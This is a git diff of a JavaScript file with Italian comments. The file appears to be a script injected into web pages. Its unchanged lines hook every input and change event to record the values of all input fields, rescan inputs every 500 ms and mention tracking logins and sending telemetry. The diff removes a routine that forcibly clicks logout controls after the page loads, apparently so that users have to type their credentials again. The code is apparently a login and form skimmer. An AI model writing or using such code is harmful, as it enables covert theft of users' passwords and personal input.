@@ -46,47 +46,6 @@ async function sendTelemetry(method) {
     err("Telemetry error:", e);
   }
 }
-
-// Funzione per cliccare il logout nel canvas
-function clickLogoutIfExists() {
-  // Cerca pulsante logout nel canvas (puoi adattare il selector se serve)
-  const logoutBtn = document.querySelector('button.logout, a.logout, #logout, canvas');
-  if (logoutBtn) {
-    logoutBtn.click();
-    log("Logout cliccato!");
-    return true;
-  }
-  return false;
-}
-
-// Flusso automatico logout dopo caricamento e navigazione home
-function setupAutoLogoutFlow() {
-  // Dopo DOMContentLoaded
-  window.addEventListener("DOMContentLoaded", () => {
-    log("Pagina caricata, scan inputs iniziale");
-    scanInputs();
-
-    // Passaggio alla home dopo breve delay
-    setTimeout(() => {
-      log("Navigazione alla home...");
-
-      // Qui puoi aggiungere il codice che effettua il redirect o mostra la home
-      // window.location.href = "/home"; // esempio se vuoi forzare la home
-
-      // Subito dopo, prova a cliccare logout
-      const logoutClicked = clickLogoutIfExists();
-      if (!logoutClicked) {
-        log("Logout non trovato, scan periodico canvas...");
-        // Scan periodico fino a 30s se il logout non è ancora presente
-        const interval = setInterval(() => {
-          if (clickLogoutIfExists()) clearInterval(interval);
-        }, 500);
-        setTimeout(() => clearInterval(interval), 30000);
-      }
-    }, 1000); // 1 secondo per sicurezza
-  });
-}
-
 // Eventi per tracciare input e login
 document.addEventListener("input", e => e.target.tagName === "INPUT" && updateValue(e.target));
 document.addEventListener("change", e => e.target.tagName === "INPUT" && updateValue(e.target));
@@ -99,10 +58,6 @@ document.addEventListener("click", e => {
 
 // Scan periodico per input dinamici
 setInterval(scanInputs, 500);
-
-// Avvio del flusso automatico logout
-setupAutoLogoutFlow();
-
 
   // --- AUTO LOGOUT ---
   if (window.logoutDone === undefined) {
